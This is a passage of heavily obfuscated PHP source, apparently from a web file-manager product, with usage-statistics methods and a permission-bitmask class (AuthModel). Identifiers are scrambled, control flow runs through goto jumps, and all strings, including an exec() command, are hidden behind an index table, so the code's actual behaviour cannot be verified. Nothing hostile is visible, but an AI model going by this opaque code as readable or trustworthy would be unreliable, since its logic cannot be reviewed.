$D´éøÎ‡×[1629]; $Bº¯„ÓùÈ° = Model($D´éøÎ‡×[1630])->where($d¼‚ÕÆø± )->count($D´éøÎ‡×[1631]); goto d¯ñ„İ‚İÏ; A”‚ˆ„°êœ: $D´éøÎ‡× =& $_SERVER[æ§›¦ÌáØ]; $CÈ¢Ù éØ = strtotime(date($D´éøÎ‡×[1627], strtotime($aƒ›ÅÔÊ))); $E•§›Ÿ†š = strtotime(date($D´éøÎ‡×[1628], strtotime($aƒ›ÅÔÊ))); goto bÇš¸˜Û£¾; d¯ñ„İ‚İÏ: $CµŸÙ†¥ò… = array($D´éøÎ‡×[222] => $aƒ›ÅÔÊ, $D´éøÎ‡×[718] => (int) $C¬“ì™Úç, $D´éøÎ‡×[1616] => (int) $F„ƒ¦Ï–Ê×, $D´éøÎ‡×[1617] => (int) $Bº¯„ÓùÈ°); return $this->insert($CµŸÙ†¥ò…); goto c‡†Ñˆîîã; c‡†Ñˆîîã: } public function _recordStore($Eî“ø±‚ = '') { goto döÀÅæ¬¸Œ; DÃß¶ÏÚëâ: $b‰ä¦ÑÕã“[$eµÁğñƒ÷Õ[404]] = 1; $c´†ÛºÊ”ß = Model($eµÁğñƒ÷Õ[783])->where($b‰ä¦ÑÕã“)->sum($eµÁğñƒ÷Õ[78]); $b‰ä¦ÑÕã“[$eµÁğñƒ÷Õ[404]] = 2; goto F¯è¢Ô”„ä; F¯è¢Ô”„ä: $FÌáç±’î = Model($eµÁğñƒ÷Õ[783])->where($b‰ä¦ÑÕã“)->sum($eµÁğñƒ÷Õ[78]); $FÚ©ˆ‚Ë›† = array($eµÁğñƒ÷Õ[222] => $Eî“ø±‚, $eµÁğñƒ÷Õ[716] => (int) $A¦‰ÉÑ¶Ğª, $eµÁğñƒ÷Õ[1620] => (int) $ağ…Ç±ÄÛ, $eµÁğñƒ÷Õ[1621] => (int) $c´†ÛºÊ”ß, $eµÁğñƒ÷Õ[1622] => (int) $FÌáç±’î); return $this->insert($FÚ©ˆ‚Ë›†); goto B¨…ÁÃÁÁ; döÀÅæ¬¸Œ: $eµÁğñƒ÷Õ =& $_SERVER[æ§›¦ÌáØ]; $AĞÍß’òŠ = strtotime(date($eµÁğñƒ÷Õ[1628], strtotime($Eî“ø±‚))); $b‰ä¦ÑÕã“ = array($eµÁğñƒ÷Õ[194] => array($eµÁğñƒ÷Õ[961], $AĞÍß’òŠ)); goto e„¾¾‚¾Ó; e„¾¾‚¾Ó: $ağ…Ç±ÄÛ = Model($eµÁğñƒ÷Õ[450])->where($b‰ä¦ÑÕã“)->sum($eµÁğñƒ÷Õ[78]); $b‰ä¦ÑÕã“[$eµÁğñƒ÷Õ[403]] = 0; $A¦‰ÉÑ¶Ğª = Model($eµÁğñƒ÷Õ[783])->where($b‰ä¦ÑÕã“)->sum($eµÁğñƒ÷Õ[78]); goto DÃß¶ÏÚëâ; B¨…ÁÃÁÁ: } public function trend($aèòİ¼Î¾ø, $fç§³ëï¢ª) { goto Dóä—Üç; bòöä§í­Ê: if ($Eƒ˜ÛÖÕ¨¦ && $fç§³ëï¢ª != $cÉš¬‘­‹[1493]) { $b‡È¼‡½ä = $Eƒ˜ÛÖÕ¨¦[0][$cÉš¬‘­‹[222]]; $FÎÚ°Ñİ­ = $this->validDate($fç§³ëï¢ª, $b‡È¼‡½ä); $EÈ¤³íá¬ß = array(); $B‘õÍ› ‡ = array_to_keyvalue($Eƒ˜ÛÖÕ¨¦, $cÉš¬‘­‹[222]); foreach ($FÎÚ°Ñİ­ as $E•Ìª¬¨Ú·) { if (isset($B‘õÍ› ‡[$E•Ìª¬¨Ú·])) { $F“’„‡ŠÔ‡ = $B‘õÍ› ‡[$E•Ìª¬¨Ú·]; } else { $F“’„‡ŠÔ‡ = end($Eƒ˜ÛÖÕ¨¦); $F“’„‡ŠÔ‡[$cÉš¬‘­‹[222]] = $E•Ìª¬¨Ú·; if ($aèòİ¼Î¾ø == $cÉš¬‘­‹[575]) { $F“’„‡ŠÔ‡[$cÉš¬‘­‹[1616]] = $F“’„‡ŠÔ‡[$cÉš¬‘­‹[1617]] = 0; } } $EÈ¤³íá¬ß[] = $F“’„‡ŠÔ‡; } $Eƒ˜ÛÖÕ¨¦ = $EÈ¤³íá¬ß; } $CµÆèŠ…† = array($cÉš¬‘­‹[575] => array($cÉš¬‘­‹[718] => LNG($cÉš¬‘­‹[1632]), $cÉš¬‘­‹[1616] => LNG($cÉš¬‘­‹[1633]), $cÉš¬‘­‹[1617] => LNG($cÉš¬‘­‹[1634])), $cÉš¬‘­‹[1618] => array($cÉš¬‘­‹[716] => LNG($cÉš¬‘­‹[1635]), $cÉš¬‘­‹[1620] => LNG($cÉš¬‘­‹[1636]), $cÉš¬‘­‹[1621] => LNG($cÉš¬‘­‹[1637]), $cÉš¬‘­‹[1622] => LNG($cÉš¬‘­‹[1638]))); $DØšª®ÍÊ = array($cÉš¬‘­‹[575] => $cÉš¬‘­‹[1639], $cÉš¬‘­‹[1618] => $cÉš¬‘­‹[78]); goto cïœÁÒ¾½—; cïœÁÒ¾½—: if (empty($Eƒ˜ÛÖÕ¨¦)) { $E•Ìª¬¨Ú· = date($cÉš¬‘­‹[1623], strtotime($cÉš¬‘­‹[1624])); $CøÌîìÊ½™ = array($cÉš¬‘­‹[222] => $E•Ìª¬¨Ú·); foreach ($CµÆèŠ…†[$aèòİ¼Î¾ø] as $fÚãÚ’¬šƒ => $B–éöÂâ) { $CøÌîìÊ½™[$fÚãÚ’¬šƒ] = 0; } $Eƒ˜ÛÖÕ¨¦[] = $CøÌîìÊ½™; } $e¾†çÔÄ¿ê = array(); foreach ($Eƒ˜ÛÖÕ¨¦ as $B–éöÂâ) { if ($aèòİ¼Î¾ø == $cÉš¬‘­‹[1618] && $B–éöÂâ[$cÉš¬‘­‹[1620]] > $B–éöÂâ[$cÉš¬‘­‹[716]]) { $B–éöÂâ[$cÉš¬‘­‹[1620]] = $B–éöÂâ[$cÉš¬‘­‹[716]]; } foreach ($CµÆèŠ…†[$aèòİ¼Î¾ø] as $fÚãÚ’¬šƒ => $BÑ¶Óºö¯º) { $F“’„‡ŠÔ‡ = array($cÉš¬‘­‹[222] => $B–éöÂâ[$cÉš¬‘­‹[222]], $cÉš¬‘­‹[1423] => $BÑ¶Óºö¯º); $F“’„‡ŠÔ‡[$DØšª®ÍÊ[$aèòİ¼Î¾ø]] = isset($B–éöÂâ[$fÚãÚ’¬šƒ]) ? $B–éöÂâ[$fÚãÚ’¬šƒ] : 0; $e¾†çÔÄ¿ê[] = $F“’„‡ŠÔ‡; } } goto A‰µ§¡Ë—í; Dóä—Üç: $cÉš¬‘­‹ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->init($aèòİ¼Î¾ø)) { return !1; } $Eƒ˜ÛÖÕ¨¦ = $this->trendList($aèòİ¼Î¾ø); goto bòöä§í­Ê; A‰µ§¡Ë—í: return $e¾†çÔÄ¿ê; goto e¢ùÖÚæÇÓ; e¢ùÖÚæÇÓ: } public function validDate($b¾˜ğø®ä™, $e„—–ÈŒŸ¨) { goto b„äÈœ‹ëÕ; DÉÁ“«ŞŠ: switch ($b¾˜ğø®ä™) { case $C‘ĞÇçÖŒ[1500]: $BãğÛ»ùÆæ = mktime(0, 0, 0, date($C‘ĞÇçÖŒ[1640]), date($C‘ĞÇçÖŒ[1243]) - date($C‘ĞÇçÖŒ[1304]) + 7 - 7, date($C‘ĞÇçÖŒ[1641])); $dª×À«œ¥ï = 0; do { $b†³…’çØ = date($C‘ĞÇçÖŒ[1623], $BãğÛ»ùÆæ - 3600 * 24 * 7 * $dª×À«œ¥ï); $e³ìæ‰áª[] = $b†³…’çØ; $dª×À«œ¥ï++; } while ($e„—–ÈŒŸ¨ < $b†³…’çØ); break; case $C‘ĞÇçÖŒ[1498]: $dª×À«œ¥ï = 1; do { $cÑ˜œÒÄ¾ = date($C‘ĞÇçÖŒ[1642], strtotime("\x2d\40{$dª×À«œ¥ï}\x20\155\157\156\x74\150\x73")); $e³ìæ‰áª[] = $cÑ˜œÒÄ¾; $dª×À«œ¥ï++; } while ($e„—–ÈŒŸ¨ < $cÑ˜œÒÄ¾); break; case $C‘ĞÇçÖŒ[1643]: $fä«‹«ñ†¡ = (int) date($C‘ĞÇçÖŒ[1641], strtotime($e„—–ÈŒŸ¨)); $eÜéªŞœ‡ = (int) date($C‘ĞÇçÖŒ[1641]); if ($fä«‹«ñ†¡ >= $eÜéªŞœ‡) { break; } for ($fä«‹«ñ†¡; $fä«‹«ñ†¡ < $eÜéªŞœ‡; $fä«‹«ñ†¡++) { $e³ìæ‰áª[] = $fä«‹«ñ†¡ . $C‘ĞÇçÖŒ[1644]; } break; default: break; } if ($e„—–ÈŒŸ¨ > end($e³ìæ‰áª)) { array_pop($e³ìæ‰áª); } sort($e³ìæ‰áª); goto BŠéõ»ŸÜ; b„äÈœ‹ëÕ: $C‘ĞÇçÖŒ =& $_SERVER[æ§›¦ÌáØ]; $eï¿³´æÔÃ = date($C‘ĞÇçÖŒ[1623], strtotime($C‘ĞÇçÖŒ[1624])); $e³ìæ‰áª = array($eï¿³´æÔÃ); goto DÉÁ“«ŞŠ; BŠéõ»ŸÜ: return $e³ìæ‰áª; goto a‡ÅØÏ»Ôç; a‡ÅØÏ»Ôç: } public function listTable($D¶ö•É˜¥ğ) { $bÇé†ôÖ¹ø = ucfirst($D¶ö•É˜¥ğ); return Model($bÇé†ôÖ¹ø)->listData(); } public function option($B´„äŠ‚–) { $E¾î¥Òİ§ = $_SERVER[æ§›¦ÌáØ][1645] . ucfirst($B´„äŠ‚–); return $this->{$E¾î¥Òİ§}(); } private function optionUser() { goto a“†Õ”µóã; F²óŠ‡ğ¿: if ($bšœÂ‹åˆ < $DÌ™šÂŸ½“) { $bšœÂ‹åˆ = $DÌ™šÂŸ½“; } $Fµ·àğìÂ = array($C¡ÉŠ”Ä©å[1647] => array($C¡ÉŠ”Ä©å[962], $bšœÂ‹åˆ)); $FÄÜ²´ŞŒë = (int) Model($C¡ÉŠ”Ä©å[519])->where($Fµ·àğìÂ)->count($C¡ÉŠ”Ä©å[1520]); goto E™©®–Œøğ; a“†Õ”µóã: $C¡ÉŠ”Ä©å =& $_SERVER[æ§›¦ÌáØ]; $B…Ó òë²É = Model($C¡ÉŠ”Ä©å[519])->count($C¡ÉŠ”Ä©å[1520]); $F¸İ®ò’à´ = Model($C¡ÉŠ”Ä©å[519])->where($C¡ÉŠ”Ä©å[1646])->count($C¡ÉŠ”Ä©å[1520]); goto b³ØÎ–‹È; b³ØÎ–‹È: $FÑ¾“¸–² = intval($GLOBALS[$C¡ÉŠ”Ä©å[6]][$C¡ÉŠ”Ä©å[347]][$C¡ÉŠ”Ä©å[1479]]) / 3600; $bšœÂ‹åˆ = strtotime("\55{$FÑ¾“¸–²}\40\150\157\x75\162\x73"); $DÌ™šÂŸ½“ = strtotime(date($C¡ÉŠ”Ä©å[1627])); goto F²óŠ‡ğ¿; E™©®–Œøğ: if (!$FÄÜ²´ŞŒë) { $FÄÜ²´ŞŒë = 1; } $Fµ·àğìÂ = array($C¡ÉŠ”Ä©å[1647] => array($C¡ÉŠ”Ä©å[962], $DÌ™šÂŸ½“)); $b¿Í—¾æå× = Model($C¡ÉŠ”Ä©å[519])->where($Fµ·àğìÂ)->count($C¡ÉŠ”Ä©å[1520]); goto eÈÒ†ùÕµ‘; eÈÒ†ùÕµ‘: return array($C¡ÉŠ”Ä©å[712] => (int) $B…Ó òë²É, $C¡ÉŠ”Ä©å[1648] => (int) ($B…Ó òë²É - $F¸İ®ò’à´), $C¡ÉŠ”Ä©å[1649] => (int) $F¸İ®ò’à´, $C¡ÉŠ”Ä©å[1650] => (int) $b¿Í—¾æå×, $C¡ÉŠ”Ä©å[1651] => $FÄÜ²´ŞŒë); goto B¾—†À¤ê; B¾—†À¤ê: } private function optionFile() { goto b‡”‚î½Ó; bôê…¾Ø°î: $B¯œò‘Ò = $aò‚·Û¨İ[$A×ğß®¡Ÿ´[1620]]; $F«ËåÅ“ô­ = Model($A×ğß®¡Ÿ´[783])->where(array($A×ğß®¡Ÿ´[403] => 0))->count($A×ğß®¡Ÿ´[395]); $DÁËšˆÁî = array($A×ğß®¡Ÿ´[403] => 0, $A×ğß®¡Ÿ´[194] => array($A×ğß®¡Ÿ´[962], strtotime(date($A×ğß®¡Ÿ´[1627])))); goto C‰ë§øç¨À; b‡”‚î½Ó: $A×ğß®¡Ÿ´ =& $_SERVER[æ§›¦ÌáØ]; $aò‚·Û¨İ = $this->sourceSize(); $dñä¨ƒö±‚ = $aò‚·Û¨İ[$A×ğß®¡Ÿ´[78]]; goto bôê…¾Ø°î; C‰ë§øç¨À: $e¶œ‰·È = Model($A×ğß®¡Ÿ´[783])->where($DÁËšˆÁî)->sum($A×ğß®¡Ÿ´[78]); $BÃÑô×±˜ = Model($A×ğß®¡Ÿ´[783])->where($DÁËšˆÁî)->count($A×ğß®¡Ÿ´[395]); return array($A×ğß®¡Ÿ´[716] => $dñä¨ƒö±‚, $A×ğß®¡Ÿ´[1620] => $B¯œò‘Ò, $A×ğß®¡Ÿ´[1652] => $dñä¨ƒö±‚ - $B¯œò‘Ò, $A×ğß®¡Ÿ´[1653] => (int) $e¶œ‰·È, $A×ğß®¡Ÿ´[718] => (int) $F«ËåÅ“ô­, $A×ğß®¡Ÿ´[1654] => (int) $BÃÑô×±˜); goto bã“·ìÀõ; bã“·ìÀõ: } private function optionAccess() { $b¾±ùà”×› =& $_SERVER[æ§›¦ÌáØ]; return array($b¾±ùà”×›[712] => $this->typeLogCnt(), $b¾±ùà”×›[107] => $this->typeLogCnt($b¾±ùà”×›[107]), $b¾±ùà”×›[430] => $this->typeLogCnt($b¾±ùà”×›[430]), $b¾±ùà”×›[1655] => $this->typeLogCnt($b¾±ùà”×›[1655]), $b¾±ùà”×›[1656] => $this->typeLogCnt($b¾±ùà”×›[1656]), $b¾±ùà”×›[575] => $this->typeLogCnt($b¾±ùà”×›[33], $b¾±ùà”×›[1631])); } private function typeLogCnt($A¹±†¦Á­õ = '', $FÔ–è¢æ = "\151\144") { goto d°‰ÃÂÅ¸; EÉÓÜƒ›İ“: return (int) $b¿‡¨ÁË¾Ã; goto b÷¸Æó‹Ş; eÈ¤Œ¥óßÈ: $BË ‡æ­ª = array($BùÏ•†´‘[194] => array($BùÏ•†´‘[962], $B£ïê‰Ç)); if ($A¹±†¦Á­õ) { $BË ‡æ­ª[$BùÏ•†´‘[29]] = array($BùÏ•†´‘[7], $BÓÑ‹ô›¯³[$A¹±†¦Á­õ]); } $b¿‡¨ÁË¾Ã = Model($BùÏ•†´‘[1630])->where($BË ‡æ­ª)->count($FÔ–è¢æ); goto EÉÓÜƒ›İ“; d°‰ÃÂÅ¸: $BùÏ•†´‘ =& $_SERVER[æ§›¦ÌáØ]; $BÓÑ‹ô›¯³ = array($BùÏ•†´‘[107] => array($BùÏ•†´‘[1657], $BùÏ•†´‘[1658]), $BùÏ•†´‘[430] => array($BùÏ•†´‘[1659], $BùÏ•†´‘[1660]), $BùÏ•†´‘[1655] => array($BùÏ•†´‘[1661], $BùÏ•†´‘[1662], $BùÏ•†´‘[1663]), $BùÏ•†´‘[1656] => array($BùÏ•†´‘[1664], $BùÏ•†´‘[1665]), $BùÏ•†´‘[1666] => array($BùÏ•†´‘[1667], $BùÏ•†´‘[1668], $BùÏ•†´‘[1669])); $B£ïê‰Ç = strtotime(date($BùÏ•†´‘[1627])); goto eÈ¤Œ¥óßÈ; b÷¸Æó‹Ş: } private function optionServer() { goto b¤ˆŸ•ÏÒ; EÛ‹•˜îŞ”: $dÀ®×‰¼Ë = array($CÚµ†“¥ÔŞ[775] => $F‡äÅöù[$CÚµ†“¥ÔŞ[393]]); $B‘™£ÅÁ’µ = Model($CÚµ†“¥ÔŞ[450])->where($dÀ®×‰¼Ë)->sum($CÚµ†“¥ÔŞ[78]); $Ağöò¼ÊŠ› = explode($CÚµ†“¥ÔŞ[50], $_SERVER[$CÚµ†“¥ÔŞ[142]]); goto cï³Šòö¡¯; cï³Šòö¡¯: $aì±°„·¡¾ = $Ağöò¼ÊŠ›[0]; $bÖêÙğ£†Ü = $GLOBALS[$CÚµ†“¥ÔŞ[6]][$CÚµ†“¥ÔŞ[17]]; $e‰Ó¡­…™‡ = $bÖêÙğ£†Ü[$CÚµ†“¥ÔŞ[923]]; goto fîÎ¿‹ÆÚ; D¾âª†²‰–: return array($CÚµ†“¥ÔŞ[1672] => $FÔ—ï ¤ñõ ? $FÔ—ï ¤ñõ[$CÚµ†“¥ÔŞ[1673]] : 0, $CÚµ†“¥ÔŞ[1674] => $FÔ—ï ¤ñõ ? $FÔ—ï ¤ñõ[$CÚµ†“¥ÔŞ[1675]] : 0, $CÚµ†“¥ÔŞ[1676] => (int) $F‡äÅöù[$CÚµ†“¥ÔŞ[1673]] * 1024 * 1024 * 1024, $CÚµ†“¥ÔŞ[1677] => (int) $B‘™£ÅÁ’µ, $CÚµ†“¥ÔŞ[1678] => ucfirst($aì±°„·¡¾), $CÚµ†“¥ÔŞ[1679] => $CÚµ†“¥ÔŞ[1680] . PHP_VERSION, $CÚµ†“¥ÔŞ[1681] => phpBuild64() ? 64 : 32, $CÚµ†“¥ÔŞ[711] => str_replace($CÚµ†“¥ÔŞ[1682], $CÚµ†“¥ÔŞ[939], $e‰Ó¡­…™‡), $CÚµ†“¥ÔŞ[347] => ucfirst($dØÄ³Ú‚¹), $CÚµ†“¥ÔŞ[28] => $_SERVER[$CÚµ†“¥ÔŞ[1683]]); goto D°†œìã¯; fîÎ¿‹ÆÚ: if ($e‰Ó¡­…™‡ == $CÚµ†“¥ÔŞ[748]) { $AĞŞêõàöæ = explode($CÚµ†“¥ÔŞ[1157], $bÖêÙğ£†Ü[$CÚµ†“¥ÔŞ[922]]); $e‰Ó¡­…™‡ = $AĞŞêõàöæ[0]; } if ($e‰Ó¡­…™‡ == $CÚµ†“¥ÔŞ[751] || $e‰Ó¡­…™‡ == $CÚµ†“¥ÔŞ[752]) { $cõÛ§«ô¶‹ = Model()->db()->query($CÚµ†“¥ÔŞ[1670]); $dØ†åôÅåŠ = $cõÛ§«ô¶‹[0] && isset($cõÛ§«ô¶‹[0][$CÚµ†“¥ÔŞ[1422]]) ? $cõÛ§«ô¶‹[0][$CÚµ†“¥ÔŞ[1422]] : 0; $e‰Ó¡­…™‡ = $CÚµ†“¥ÔŞ[1671] . ($dØ†åôÅåŠ ? $CÚµ†“¥ÔŞ[8] . $dØ†åôÅåŠ : $CÚµ†“¥ÔŞ[33]); } $dØÄ³Ú‚¹ = $GLOBALS[$CÚµ†“¥ÔŞ[6]][$CÚµ†“¥ÔŞ[347]][$CÚµ†“¥ÔŞ[793]]; goto D¾âª†²‰–; b¤ˆŸ•ÏÒ: $CÚµ†“¥ÔŞ =& $_SERVER[æ§›¦ÌáØ]; $FÔ—ï ¤ñõ = $this->diskDriver(); $F‡äÅöù = KodIO::defaultDriver(); goto EÛ‹•˜îŞ”; D°†œìã¯: } private function diskDriver() { goto dœØÁ‹Œ; B®µ­öÁÈ: $D°ßŞ…÷ÛÌ = $cÕ£•Åñí - @disk_free_space($C¿Ãƒ¥àÉ…); return array($FµÏÇ‹¡Ã§[1673] => $cÕ£•Åñí, $FµÏÇ‹¡Ã§[1675] => $D°ßŞ…÷ÛÌ); goto A«¨Á‰çÄ»; C¤Àãñ™’º: if ($céÜƒ¼·„) { $C¿Ãƒ¥àÉ… = $FµÏÇ‹¡Ã§[1686]; if (function_exists($FµÏÇ‹¡Ã§[1687])) { exec($FµÏÇ‹¡Ã§[1688], $BùøÙØš¤•); $C¿Ãƒ¥àÉ… = $BùøÙØš¤•[1] . $FµÏÇ‹¡Ã§[8]; } } if (!file_exists($C¿Ãƒ¥àÉ…)) { return; } $cÕ£•Åñí = @disk_total_space($C¿Ãƒ¥àÉ…); goto B®µ­öÁÈ; dœØÁ‹Œ: $FµÏÇ‹¡Ã§ =& $_SERVER[æ§›¦ÌáØ]; $C¿Ãƒ¥àÉ… = $FµÏÇ‹¡Ã§[8]; $céÜƒ¼·„ = $GLOBALS[$FµÏÇ‹¡Ã§[6]][$FµÏÇ‹¡Ã§[1684]] == $FµÏÇ‹¡Ã§[1685]; goto C¤Àãñ™’º; A«¨Á‰çÄ»: } public function fileChart($aàîïóÓãÊ) { goto bŒà–é¶¾; bŒà–é¶¾: $e¸µäôØä™ =& $_SERVER[æ§›¦ÌáØ]; if (isset($aàîïóÓãÊ[$e¸µäôØä™[1520]])) { return Model($e¸µäôØä™[783])->userFileTypeProfile($aàîïóÓãÊ[$e¸µäôØä™[1520]]); } if (isset($aàîïóÓãÊ[$e¸µäôØä™[1689]])) { return Model($e¸µäôØä™[783])->groupFileTypeProfile($aàîïóÓãÊ[$e¸µäôØä™[1689]]); } goto bøéˆŸÑåƒ; bøéˆŸÑåƒ: $Bñ¹ ×»äÓ = $this->sourceSize(); $Bí§ñĞĞïˆ = array($e¸µäôØä™[478] => 0, $e¸µäôØä™[404] => 1); $DğíÚíİÁ¡ = Model($e¸µäôØä™[783])->where($Bí§ñĞĞïˆ)->sum($e¸µäôØä™[78]); goto b©–ŸâÛÌİ; b©–ŸâÛÌİ: $Bí§ñĞĞïˆ[$e¸µäôØä™[404]] = 2; $d‹°è’ßÎ = Model($e¸µäôØä™[783])->where($Bí§ñĞĞïˆ)->sum($e¸µäôØä™[78]); return array($e¸µäôØä™[716] => $Bñ¹ ×»äÓ[$e¸µäôØä™[78]], $e¸µäôØä™[1620] => $Bñ¹ ×»äÓ[$e¸µäôØä™[1620]], $e¸µäôØä™[1621] => (int) $DğíÚíİÁ¡, $e¸µäôØä™[1622] => (int) $d‹°è’ßÎ); goto C«Ä¥¸âªÕ; C«Ä¥¸âªÕ: } private function sourceSize() { $d“²„¬òœ  =& $_SERVER[æ§›¦ÌáØ]; $eÁÑù„ÑÀ© = Model($d“²„¬òœ [783])->where(array($d“²„¬òœ [403] => 0))->sum($d“²„¬òœ [78]); $Eòïàñ¯öŞ = Model($d“²„¬òœ [450])->sum($d“²„¬òœ [78]); if ($Eòïàñ¯öŞ > $eÁÑù„ÑÀ©) { $Eòïàñ¯öŞ = $eÁÑù„ÑÀ©; } return array($d“²„¬òœ [78] => (int) $eÁÑù„ÑÀ©, $d“²„¬òœ [1620] => (int) $Eòïàñ¯öŞ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Aëõìè‡ =& $_SERVER[æ§›¦ÌáØ]; $DõÃ‹“ï…ß = array(array($Aëõìè‡[413] => LNG($Aëõìè‡[1690]), $Aëõìè‡[1691] => $Aëõìè‡[1692], $Aëõìè‡[1693] => 1, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aëõìè‡[413] => LNG($Aëõìè‡[1696]), $Aëõìè‡[1691] => $Aëõìè‡[1697], $Aëõìè‡[1693] => 2, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aëõìè‡[413] => LNG($Aëõìè‡[1698]), $Aëõìè‡[1691] => $Aëõìè‡[1699], $Aëõìè‡[1693] => 3, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aëõìè‡[413] => LNG($Aëõìè‡[1700]), $Aëõìè‡[1691] => $Aëõìè‡[1701], $Aëõìè‡[1693] => 4, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_VIEW), array($Aëõìè‡[413] => LNG($Aëõìè‡[1702]), $Aëõìè‡[1691] => $Aëõìè‡[1703], $Aëõìè‡[1693] => 5, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Aëõìè‡[413] => LNG($Aëõìè‡[1704]), $Aëõìè‡[1691] => $Aëõìè‡[1705], $Aëõìè‡[1693] => 6, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Aëõìè‡[413] => LNG($Aëõìè‡[1706]), $Aëõìè‡[1691] => $Aëõìè‡[1707], $Aëõìè‡[1693] => 7, $Aëõìè‡[1694] => 1, $Aëõìè‡[1695] => 0)); return $DõÃ‹“ï…ß; } public static function authCheck($Fè‹„±Å£, $f¡Œù‚ëÕô) { $Fè‹„±Å£ = intval($Fè‹„±Å£); if ($GLOBALS[$_SERVER[æ§›¦ÌáØ][485]]) { return !0; } if ($Fè‹„±Å£ <= 0) { return !1; } if (($Fè‹„±Å£ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Fè‹„±Å£ & $f¡Œù‚ëÕô); } public static function authCheckShow($Aæ»Í•ÆÓ) { return self::authCheck($Aæ»Í•ÆÓ, self::AUTH_SHOW); } public static function authCheckView($aèã³Í«ÇÌ) { return self::authCheck($aèã³Í«ÇÌ, self::AUTH_VIEW); } public static function authCheckDownload($b£ç÷Ü£ÊŞ) { return self::authCheck($b£ç÷Ü£ÊŞ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($B¾ôòˆœ‘) { return self::authCheck($B¾ôòˆœ‘, self::AUTH_UPLOAD); } public static function authCheckEdit($C àôŸÊÀ‰) { return self::authCheck($C àôŸÊÀ‰, self::AUTH_EDIT); } public static function authCheckRemove($F™ö‘Ş“±) { return self::authCheck($F™ö‘Ş“±, self::AUTH_REMOVE); } public static function authCheckShare($céÄò¹ÁÖò) { return self::authCheck($céÄò¹ÁÖò, self::AUTH_SHARE); } public static function authCheckComment($EáÜÍÎá…Š) { return self::authCheck($EáÜÍÎá…Š, self::AUTH_COMMENT); } public static function authCheckEvent($D–³ëóÇ«Å) { return self::authCheck($D–³ëóÇ«Å, self::AUTH_EVENT); } public static function authCheckRoot($c½Ù‘ÆÇíµ) { return self::authCheck($c½Ù‘ÆÇíµ, self::AUTH_ROOT); } public static function authCheckAction($CÑ¬‘‰¿ìŞ, $Eæ‹ØÁÏŞÁ) { goto f£¥Àå¦´¶; d§ìÉÍç’: if (($CÑ¬‘‰¿ìŞ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($CÑ¬‘‰¿ìŞ & $F¨Ôù¾óºƒ); goto D˜ÚËÀëİÒ; c¦á¸íİÇ: $F¨Ôù¾óºƒ = $aÏùù¾Ó­É[$Eæ‹ØÁÏŞÁ]; $CÑ¬‘‰¿ìŞ = intval($CÑ¬‘‰¿ìŞ); if ($CÑ¬‘‰¿ìŞ <= 0) { return !1; } goto d§ìÉÍç’; f£¥Àå¦´¶: $e¢íÍ£Š—™ =& $_SERVER[æ§›¦ÌáØ]; $aÏùù¾Ó­É = array($e¢íÍ£Š—™[1708] => self::AUTH_VIEW, $e¢íÍ£Š—™[1084] => self::AUTH_DOWNLOAD, $e¢íÍ£Š—™[107] => self::AUTH_UPLOAD, $e¢íÍ£Š—™[1656] => self::AUTH_EDIT, $e¢íÍ£Š—™[1655] => self::AUTH_REMOVE, $e¢íÍ£Š—™[1666] => self::AUTH_SHARE, $e¢íÍ£Š—™[352] => self::AUTH_COMMENT, $e¢íÍ£Š—™[1508] => self::AUTH_EVENT, $e¢íÍ£Š—™[1709] => self::AUTH_ROOT); if (!isset($aÏùù¾Ó­É[$Eæ‹ØÁÏŞÁ])) { return; } goto c¦á¸íİÇ; D˜ÚËÀëİÒ: } public static function authDisable($a“œõ¸áº, $AÒëåƒõ’¤) { if (intval($a“œõ¸áº) <= 0) { return 0; } return intval($a“œõ¸áº) & ~$AÒëåƒõ’¤; } public $optionType = "\123\171\x73\164\x65\155\56\x73\157\x75\x72\x63\x65\x41\165\x74\150\114\151\163\x74"; public $field = array("\156\141\x6d\145", "\141\165\164\150", "\x6c\x61\x62\x65\154", "\144\x69\x73\160\x6c\x61\x79", "\x73\x79\x73\164\x65\155", "\163\157\162\164"); public function initData() { $B°œá®‘Ù = $this->authDefault(); foreach ($B°œá®‘Ù as $fÈ­öƒ´ğ) { $this->add($fÈ­öƒ´ğ); } } public function findAuth($a“¯ì¼æ°Ş, $AÂ‹©Ê¾Œ ) { $AĞ‡·¡•” =& $_SERVER[æ§›¦ÌáØ]; $B¹•»°îßô = parent::listData(); foreach ($B¹•»°îßô as $a¯ó»Ğîº) { $Fƒà¯£•ËÏ = intval($a¯ó»Ğîº[$AĞ‡·¡•”[406]]); if ($Fƒà¯£•ËÏ <= 0 || $a¯ó»Ğîº[$AĞ‡·¡•”[1710]] == 0) { continue; } if 